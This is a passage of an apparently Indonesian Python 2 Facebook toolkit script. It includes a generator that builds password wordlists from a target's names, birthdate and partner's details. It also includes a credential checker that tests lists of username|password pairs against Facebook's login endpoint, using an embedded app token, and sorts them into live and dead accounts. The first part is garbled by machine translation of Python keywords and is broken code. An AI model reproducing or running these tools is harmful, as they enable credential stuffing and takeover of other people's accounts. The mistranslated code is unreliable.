        jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mHarap tunggu \ x1b [1; 97m ...')
        cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
        cetak '\ x1b [1; 97mStop \ x1b [1; 91mCTRL + C'
        mencetak
        mencoba:
            pek = requests.get ('https://graph.facebook.com/me/friends?access_token=' + toket)
            cok = json.loads (pek.text)
            untuk saya di cok ['data']:
                nama = i ['nama']
                id = i ['id']
                requests.delete ('https://graph.facebook.com/me/friends?uid=' + id + '& access_token =' + toket)
                cetak '\ x1b [1; 97m [\ x1b [1; 92mHapus \ x1b [1; 97m]' + nama + '=>' + id

        kecuali IndexError:
            lulus
        kecuali KeyboardInterrupt:
            cetak '\ x1b [1; 91m [!] Berhenti'
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            menu_bot ()

    cetak '\ n \ x1b [1; 91m [+] \ x1b [1; 97mFinish'
    masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
    menu_bot ()


def lain ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (1)
        Gabung()

    os.system ('clear')
    cetak logo
    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
    cetak '║-> \ x1b [1; 37; 40m1. Buat Status '
    cetak '║-> \ x1b [1; 37; 40m2. Buat Daftar Kata '
    cetak '║-> \ x1b [1; 37; 40m3. cek akun '
    cetak '║-> \ x1b [1; 37; 40m4. Daftar Grup '
    cetak '║-> \ x1b [1; 37; 40m5. Profil Perisai Foto '
    cetak '║-> \ x1b [1; 31; 40m0. Kembali'
    cetak '\ x1b [1; 37; 40m║'
    pilih_lain ()


def pilih_lain ():
    other = input_kasar ('╚═ \ x1b [1; 91m ▶ \ x1b [1; 97m')
    jika lainnya == '':
        print '\ x1b [1; 91m [!] Tidak boleh kosong'
        pilih_lain ()
    lain:
        jika lainnya == '1':
            status()
        lain:
            jika lainnya == '2':
                Daftar kata()
            lain:
                jika lainnya == '3':
                    check_akun ()
                lain:
                    jika lainnya == '4':
                        grupsaya ()
                    lain:
                        jika lainnya == '5':
                            menjaga()
                        lain:
                            jika lainnya == '0':
                                Tidak bisa()
                            lain:
                                cetak '\ x1b [1; 91m [\ xe2 \ x9c \ x96] \ x1b [1; 97m' + other + '\ x1b [1; 91mnot found'
                                pilih_lain ()


status def ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (1)
        Gabung()

    os.system ('clear')
    cetak logo
    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
    msg = raw_input ('\ x1b [1; 91m [+] \ x1b [1; 92mTulis status \ x1b [1; 91m: \ x1b [1; 97m')
    jika msg == '':
        print '\ x1b [1; 91m [!] Tidak boleh kosong'
        masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
        lain ()
    lain:
        res = requests.get ('https://graph.facebook.com/me/feed?method=POST&message=' + msg + '& access_token =' + toket)
        op = json.loads (res.text)
        jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mHarap tunggu \ x1b [1; 97m ...')
        cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
        cetak '\ x1b [1; 91m [+] \ x1b [1; 92mStatus ID \ x1b [1; 91m: \ x1b [1; 97m' + op ['id']
        masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
        lain ()


def daftar kata ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (1)
        Gabung()
    lain:
        mencoba:
            os.system ('clear')
            cetak logo
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
            print '\ x1b [1; 91m [?] \ x1b [1; 92mIsi data lengkap target dibawah'
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
            a = input_kawal ('\ x1b [1; 91m [+] \ x1b [1; 92mName Depan \ x1b [1; 97m:')
            file = open (a + '.txt', 'w')
            b = input_kasar ('\ x1b [1; 91m [+] \ x1b [1; 92mName Tengah \ x1b [1; 97m:')
            c = input_makan ('\ x1b [1; 91m [+] \ x1b [1; 92mName Belakang \ x1b [1; 97m:')
            d = input_dasar ('\ x1b [1; 91m [+] \ x1b [1; 92mName Panggilan \ x1b [1; 97m:')
            e = raw_input('\x1b[1;91m[+] \x1b[1;92mTanggal Lahir >\x1b[1;96mex: |DDMMYY| \x1b[1;97m: ')
            f = e[0:2]
            g = e[2:4]
            h = e[4:]
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            print '\x1b[1;91m[?] \x1b[1;93mKalo Jomblo SKIP aja :v'
            i = raw_input('\x1b[1;91m[+] \x1b[1;92mName Pacar \x1b[1;97m: ')
            j = raw_input('\x1b[1;91m[+] \x1b[1;92mName Panggilan Pacar \x1b[1;97m: ')
            k = raw_input('\x1b[1;91m[+] \x1b[1;92mTanggal Lahir Pacar >\x1b[1;96mex: |DDMMYY| \x1b[1;97m: ')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            l = k[0:2]
            m = k[2:4]
            n = k[4:]
            file.write('%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s' % (a, c, a, b, b, a, b, c, c, a, c, b, a, a, b, b, c, c, a, d, b, d, c, d, d, d, d, a, d, b, d, c, a, e, a, f, a, g, a, h, b, e, b, f, b, g, b, h, c, e, c, f, c, g, c, h, d, e, d, f, d, g, d, h, e, a, f, a, g, a, h, a, e, b, f, b, g, b, h, b, e, c, f, c, g, c, h, c, e, d, f, d, g, d, h, d, d, d, a, f, g, a, g, h, f, g, f, h, f, f, g, f, g, h, g, g, h, f, h, g, h, h, h, g, f, a, g, h, b, f, g, b, g, h, c, f, g, c, g, h, d, f, g, d, g, h, a, i, a, j, a, k, i, e, i, j, i, k, b, i, b, j, b, k, c, i, c, j, c, k, e, k, j, a, j, b, j, c, j, d, j, j, k, a, k, b, k, c, k, d, k, k, i, l, i, m, i, n, j, l, j, m, j, n, j, k))
            wg = 0
            while wg < 100:
                wg = wg + 1
                file.write(a + str(wg) + '\n')

            en = 0
            while en < 100:
                en = en + 1
                file.write(i + str(en) + '\n')

            word = 0
            while word < 100:
                word = word + 1
                file.write(d + str(word) + '\n')

            gen = 0
            while gen < 100:
                gen = gen + 1
                file.write(j + str(gen) + '\n')

            file.close()
            time.sleep(1.5)
            print '\n\x1b[1;91m[+] \x1b[1;97mSaved \x1b[1;91m: \x1b[1;97m %s.txt' % a
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()
        except IOError as e:
            print '\x1b[1;91m[!] Make file failed'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()


def check_akun():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[?] \x1b[1;92mIsi File\x1b[1;91m : \x1b[1;97musername|password'
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        live = []
        cek = []
        die = []
        try:
            file = raw_input('\x1b[1;91m[+] \x1b[1;92mFile \x1b[1;91m:\x1b[1;97m ')
            list = open(file, 'r').readlines()
        except IOError:
            print '\x1b[1;91m[!] File not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()

    pemisah = raw_input('\x1b[1;91m[+] \x1b[1;92mSeparator \x1b[1;91m:\x1b[1;97m ')
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    for meki in list:
        username, password = meki.strip().split(str(pemisah))
        url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + password + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
        data = requests.get(url)
        mpsh = json.loads(data.text)
        if 'access_token' in mpsh:
            live.append(password)
            print '\x1b[1;97m[\x1b[1;92mLive\x1b[1;97m]  \x1b[1;97m' + username + ' | ' + password
        elif 'www.facebook.com' in mpsh['error_msg']:
            cek.append(password)
            print '\x1b[1;97m[\x1b[1;93mCheck\x1b[1;97m] \x1b[1;97m' + username + ' | ' + password
        else:
            die.append(password)
            print '\x1b[1;97m[\x1b[1;91mDie\x1b[1;97m]  \x1b[1;97m' + username + ' | ' + password

    print '\n\x1b[1;91m[+] \x1b[1;97mTotal\x1b[1;91m : \x1b[1;97mLive=\x1b[1;92m' + str(len(live)) + ' \x1b[1;97mCheck=\x1b[1;93m' + str(len(cek)) + ' \x1b[1;97mDie=\x1b[1;91m' + str(len(die))
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    lain()


def grupsaya():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        try:
            uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
            gud = json.loads(uh.text)
            for p in gud['data']:
                nama = p['name']
                id = p['id']
                f = open('grupid.txt', 'w')
                listgrup.append(id)
                f.write(id + '\n')
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName  \x1b[1;91m:\x1b[1;97m ' + str(nama)
                print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + str(id)
                print 52 * '\x1b[1;97m='

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Group \x1b[1;96m%s' % len(listgrup)
            print '\x1b[1;91m[+] \x1b[1;97mSaved \x1b[1;91m: \x1b[1;97mgrupid.txt'
            f.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()
        except KeyError:
            os.remove('grupid.txt')
            print '\x1b[1;91m[!] Group not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()


def guard():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '║-> \x1b[1;37;40m1. Enable'
    print '║-> \x1b[1;37;40m2. Disable'
    print '║-> \x1b[1;31;40m0. Back'
    print '\x1b[1;37;40m║'
    g = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
    if g == '1':
        aktif = 'true'
        gaz(toket, aktif)
    else:
        if g == '2':
            non = 'false'
            gaz(toket, non)
        else:
            if g == '0':
                lain()
            else:
                if g == '':
                    keluar()
                else:
                    keluar()


def get_userid(toket):
    url = 'https://graph.facebook.com/me?access_token=%s' % toket
    res = requests.get(url)
    uid = json.loads(res.text)
    return uid['id']


def gaz(toket, enable=True):
    id = get_userid(toket)
    data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth %s' % toket}
    url = 'https://graph.facebook.com/graphql'
    res = requests.post(url, data=data, headers=headers)
    print res.text
    if '"is_shielded":true' in res.text:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mActivated'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        lain()
    else:
        if '"is_shielded":false' in res.text:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;91mDeactivated'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()
        else:
            print '\x1b[1;91m[!] Error'
            keluar()


if __name__ == '__main__':
	login()
